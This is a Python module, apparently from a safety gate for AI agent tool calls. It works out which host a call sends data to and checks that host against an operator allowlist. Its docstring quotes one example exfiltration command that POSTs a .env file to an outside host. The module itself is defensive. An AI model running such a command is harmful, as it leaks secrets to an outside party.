"""Destination trust: which host a tool call sends data to, computed in code.

The gate's egress judgement is currently made from the raw text of the call: the model reads
`action.arguments` and decides whether it looks like exfiltration. For `git push origin main`
there is nothing in that string to read, because the destination lives in the repository's own
`.git/config`. For `curl -X POST -d @.env https://example.com` the host is present but must be
matched against operator intent, which the model cannot see. Both cases are inference from a
string, and inference from a string is where the false positives and the misses come from.

This module computes the destination in code instead, so the gate is handed a fact rather than
asked for an opinion.

**The fact is inert until an operator configures an allowlist.** With no allowlist configured,
`allowlisted` is None and the derived signal never fires, so the gate behaves exactly as it did
before this module existed. That is deliberate: a new safety signal that changes behaviour the
moment it lands cannot be enabled by default.

Three fields are computed; **two leave the machine**:

- ``host``: the normalized destination hostname, or None. Kept local for the decision log,
  never placed in the state sent to the provider.
- ``known``: whether a destination could be determined at all. Sent.
- ``allowlisted``: whether that host is on the operator's allowlist, or None. Sent.

The host is excluded from the state on purpose. The measured separation comes from the allowlist
verdict rather than the hostname, so sending the host buys no accuracy, and not sending it keeps
this plugin's egress surface to code-computed booleans. The host still reaches
``~/.hermes/logs/jev-judge.log``, because an operator reviewing why a call was allowed needs to
see which host it went to.

Tri-state polarity is inverted relative to a hazard flag, and that is the point:
``allowlisted`` is a *permission*, so unknown (None) must be read as **not permitted**, never as
safe. An empty or unreadable allowlist therefore yields None for every call rather than False:
an empty allowlist is the absence of a policy, not a deny-list.

The extractor is conservative in the direction that cannot suppress a warning. A call naming
more than one distinct host resolves to unknown, never to whichever host looks friendly, so a
decoy cannot talk the gate out of a warning.
"""

from __future__ import annotations

import os
import re
from dataclasses import dataclass
from pathlib import Path
from typing import Any

#: The three fields this module computes.
DEST_HOST = "dest_host"
DEST_KNOWN = "dest_known"
DEST_ALLOWLISTED = "dest_allowlisted"

#: The fields that go into the provider state. ``dest_host`` is not among them.
WIRE_FIELDS: tuple[str, ...] = (DEST_KNOWN, DEST_ALLOWLISTED)

#: Longest host this module will report.
MAX_HOST_CHARS = 64

#: The environment variable an operator can set instead of the plugin setting.
ALLOWLIST_ENV_VAR = "JEV_JUDGE_DEST_ALLOWLIST"

_HOST_LABEL = r"[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?"
_HOST_RE = re.compile(rf"^(?:{_HOST_LABEL})(?:\.{_HOST_LABEL})*$")
_IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")

_URL_SCHEMES = (
    "http://",
    "https://",
    "ssh://",
    "git://",
    "git+ssh://",
    "ftp://",
    "ftps://",
)

#: ``scp``/``rsync`` remote: ``[user@]host:path``.
#:
#: The path must start with ``/`` or ``~``. That requirement is what keeps an ordinary
#: ``a.b:c`` token (a filename with a suffix, an image tag) from being read as a host. It
#: deliberately does not match a bare ``host:relative-path``, which is ambiguous: not resolving
#: it degrades to the previous behaviour, whereas guessing wrong would report a host that is not
#: there. The leading ``user@`` is optional because ``rsync host:/path`` is a standard form, and
#: the no-whitespace anchor keeps a shell line naming several files from matching.
_SCP_RE = re.compile(r"^(?:[A-Za-z0-9._-]+@)?([A-Za-z0-9.-]+):(?:/|~)[^\s@]*$")

_QUOTES = "\"'`"

#: Argument keys that name a destination, in the order they are tried.
_URL_KEYS = ("url", "uri", "endpoint", "host", "dest", "destination", "target_url", "webhook")
#: Argument keys holding a command line.
_COMMAND_KEYS = ("command", "cmd", "script", "shell_command")

#: A bare hostname token, for the load-bearing case of ``git push origin main``.
_HOST_TOKEN_RE = re.compile(rf"^{_HOST_LABEL}(?:\.{_HOST_LABEL})+$")

#: ``git`` subcommands whose destination comes from a configured remote.
_GIT_REMOTE_SUBCOMMANDS = frozenset({"push", "fetch", "pull", "clone", "ls-remote", "remote"})

_GIT_CONFIG_MAX_BYTES = 65536


@dataclass(frozen=True)
class Destination:
    """Tri-state destination trust for one tool call."""

    host: str | None
    known: bool
    allowlisted: bool | None

    @property
    def untrusted(self) -> bool:
        """Whether this call is known to be going somewhere the operator did not allow.

        False whenever the question cannot be answered from policy: no destination, or no
        allowlist configured. Those cases are left to the existing ``sends_outbound`` signal
        rather than being answered here with a guess.
        """
        return self.known and self.allowlisted is False

    def as_state(self) -> dict[str, bool | None]:
        """The wire fields: the two flags, never the host."""
        return {DEST_KNOWN: self.known, DEST_ALLOWLISTED: self.allowlisted}

    def as_state_field(self) -> dict[str, dict[str, bool | None]]:
        """The nested form placed in the provider state."""
        return {"destination": self.as_state()}

    def as_event(self) -> dict[str, str | bool | None]:
        """Every field including the host, for the local decision log."""
        return {DEST_HOST: self.host, DEST_KNOWN: self.known, DEST_ALLOWLISTED: self.allowlisted}


UNKNOWN = Destination(host=None, known=False, allowlisted=None)


def normalize_host(value: object) -> str | None:
    """A hostname, lowercased and validated, or None if it is not one.

    Strips a scheme, userinfo, port, path, query and fragment. Never truncates: a host too long
    to report returns None, because a shortened host is a different host.
    """
    if not isinstance(value, str):
        return None
    text = value.strip()
    if not text:
        return None
    if "://" in text:
        text = text.split("://", 1)[1]
    if "@" in text:
        text = text.rsplit("@", 1)[1]
    if text.startswith("["):  # bracketed IPv6 is a documented v2 candidate, not guessed at
        return None
    for sep in ("/", "?", "#"):
        text = text.split(sep, 1)[0]
    if ":" in text:
        head, _, tail = text.partition(":")
        if tail.isdigit():
            text = head
        else:
            return None
    text = text.rstrip(".").lower()
    if not text or len(text) > MAX_HOST_CHARS:
        return None
    if _IPV4_RE.match(text):
        return text if all(int(part) <= 255 for part in text.split(".")) else None
    if not _HOST_RE.match(text):
        return None
    if "." not in text:
        # A single label is not a public destination; ``localhost`` is loopback, and reporting
        # it would let an allowlist entry cover it.
        return None
    return text


def host_matches(host: str, entry: str) -> bool:
    """Label-boundary match, so ``github.com`` covers ``api.github.com`` not ``notgithub.com``."""
    candidate = entry.strip().strip(".").lower()
    if not candidate:
        return False
    subject = host.lower()
    return subject == candidate or subject.endswith("." + candidate)


def is_allowlisted(host: str, allowlist: frozenset[str]) -> bool | None:
    """Whether *host* is on *allowlist*, or None when there is no policy to apply."""
    if not allowlist:
        return None
    return any(host_matches(host, entry) for entry in allowlist)


def parse_allowlist(value: object) -> frozenset[str]:
    """An allowlist from a setting or an environment variable.

    Accepts a list, or a comma- or whitespace-separated string. Unreadable entries are dropped
    rather than raising, and a value that yields nothing leaves the feature inert.
    """
    entries: list[str] = []
    if isinstance(value, str):
        entries = [part for part in re.split(r"[,\s]+", value) if part]
    elif isinstance(value, (list, tuple, set, frozenset)):
        for item in value:
            if isinstance(item, str):
                entries.extend(part for part in re.split(r"[,\s]+", item) if part)
    cleaned = {entry.strip().strip(".").lower() for entry in entries}
    return frozenset(entry for entry in cleaned if entry)


def allowlist_from_env(environ: Any = None) -> frozenset[str]:
    """The allowlist from the environment, for callers that have no settings dict."""
    env = os.environ if environ is None else environ
    if not hasattr(env, "get"):
        return frozenset()
    return parse_allowlist(env.get(ALLOWLIST_ENV_VAR, ""))


def _host_from_token(token: str) -> str | None:
    text = token.strip(_QUOTES)
    lowered = text.lower()
    for scheme in _URL_SCHEMES:
        if lowered.startswith(scheme):
            return normalize_host(text)
    if "://" in text:
        return None  # a scheme this module does not treat as egress, for example file://
    scp = _SCP_RE.match(text)
    if scp:
        return normalize_host(scp.group(1))
    # A bare hostname token. This is what makes `git push origin main` resolvable, and it is
    # also the conservative direction: a token that merely looks like a hostname contributes a
    # host, and two hosts resolve to unknown rather than to the friendly one.
    if _HOST_TOKEN_RE.match(lowered):
        return normalize_host(lowered)
    return None


#: A remote URL as it appears in ``.git/config``: ``[user@]host:path`` with any path form.
#:
#: Permissive on purpose, and only used for values read out of a git config, where the string is
#: known to be a remote URL. ``git@github.com:org/repo.git`` is the standard SSH clone URL and
#: its path has no leading slash, so the strict command-token form below would miss it. Reading a
#: bare ``host:path`` token off a command line stays ambiguous and is still not matched.
_REMOTE_URL_RE = re.compile(r"^(?:[A-Za-z0-9._-]+@)?([A-Za-z0-9.-]+):[^\s@]+$")


def host_from_remote_url(value: object) -> str | None:
    """The host of a remote URL from a git config. Permissive about the path form."""
    if not isinstance(value, str):
        return None
    text = value.strip().strip(_QUOTES)
    if not text:
        return None
    for scheme in _URL_SCHEMES:
        if text.lower().startswith(scheme):
            return normalize_host(text)
    if "://" in text:
        return None
    match = _REMOTE_URL_RE.match(text)
    if match:
        return normalize_host(match.group(1))
    return None


def _iter_strings(value: Any, depth: int = 0) -> list[str]:
    """Every string in a nested argument structure, bounded."""
    if depth > 6:
        return []
    if isinstance(value, str):
        return [value]
    if isinstance(value, dict):
        out: list[str] = []
        for item in value.values():
            out.extend(_iter_strings(item, depth + 1))
        return out
    if isinstance(value, (list, tuple)):
        out = []
        for item in value:
            out.extend(_iter_strings(item, depth + 1))
        return out
    return []


def hosts_in_command(command: str) -> set[str]:
    """Every host named by a command line."""
    hosts: set[str] = set()
    for token in command.split():
        host = _host_from_token(token)
        if host is not None:
            hosts.add(host)
    return hosts


def _git_remote_hosts(command: str, cwd: str | None) -> set[str]:
    """The hosts of the git remotes a repository command would talk to.

    ``git push origin main`` names no host, so the destination has to come from the repository's
    own configuration. This reads ``.git/config`` directly and **never runs git**: running a
    program to decide whether to run a program is the wrong shape for a gate, and it is why
    ``git`` is not on this plugin's judged-tool list.

    Only used when the command names no host of its own, so an explicit URL always wins.
    """
    tokens = command.split()
    if not tokens or tokens[0].strip(_QUOTES).rsplit("/", 1)[-1] != "git":
        return set()
    subcommand = next((t for t in tokens[1:] if not t.startswith("-")), "")
    if subcommand not in _GIT_REMOTE_SUBCOMMANDS:
        return set()
    return _hosts_from_git_config(cwd)


def _hosts_from_git_config(cwd: str | None) -> set[str]:
    """Hosts of every ``remote.<name>.url`` in the repository config, bounded and never raising."""
    hosts: set[str] = set()
    try:
        root = Path(cwd) if cwd else Path.cwd()
        config = root / ".git" / "config"
        if not config.is_file():
            # A worktree keeps the real config elsewhere; the ``gitdir`` pointer is one line.
            pointer = root / ".git"
            if pointer.is_file():
                text = pointer.read_text(encoding="utf-8", errors="replace")[:2048]
                match = re.search(r"^gitdir:\s*(.+)$", text, re.MULTILINE)
                if match:
                    config = Path(match.group(1).strip()) / "config"
            if not config.is_file():
                return hosts
        if config.stat().st_size > _GIT_CONFIG_MAX_BYTES:
            return hosts
        for line in config.read_text(encoding="utf-8", errors="replace").splitlines():
            line = line.strip()
            if not line.lower().startswith("url") or "=" not in line:
                continue
            key, _, raw = line.partition("=")
            if not key.strip().lower().startswith("url"):
                continue
            host = host_from_remote_url(raw.strip())
            if host is not None:
                hosts.add(host)
    except Exception:  # an unreadable config means no destination, never a wrong one
        return hosts
    return hosts


def resolve_destination(
    *,
    tool_name: str = "",
    args: Any = None,
    allowlist: frozenset[str] = frozenset(),
    cwd: str | None = None,
) -> Destination:
    """Compute destination trust for one tool call. Pure; never raises.

    Exactly one distinct host must be determined for ``known`` to be True. A call naming two
    hosts is reported as unknown rather than as whichever host looks friendly, so a decoy
    cannot talk the gate out of a warning.
    """
    try:
        hosts: set[str] = set()
        commands: list[str] = []
        if isinstance(args, dict):
            for key in _COMMAND_KEYS:
                value = args.get(key)
                if isinstance(value, str) and value.strip():
                    commands.append(value)
                    hosts |= hosts_in_command(value)
            for key in _URL_KEYS:
                value = args.get(key)
                if isinstance(value, str) and value.strip():
                    host = normalize_host(value)
                    if host is not None:
                        hosts.add(host)
        if not hosts:
            for command in commands:
                hosts |= _git_remote_hosts(command, cwd)
        if not hosts:
            # Fall back to scanning the whole structure for a URL-shaped string. This is what
            # catches a destination in a tool this module has no key list for.
            for text in _iter_strings(args):
                host = _host_from_token(text) if text.startswith(_URL_SCHEMES) else None
                if host is not None:
                    hosts.add(host)
        if len(hosts) != 1:
            return UNKNOWN
        host = next(iter(hosts))
        return Destination(host=host, known=True, allowlisted=is_allowlisted(host, allowlist))
    except Exception:  # a bug here must mean unknown, never a wrong host or a False
        return UNKNOWN
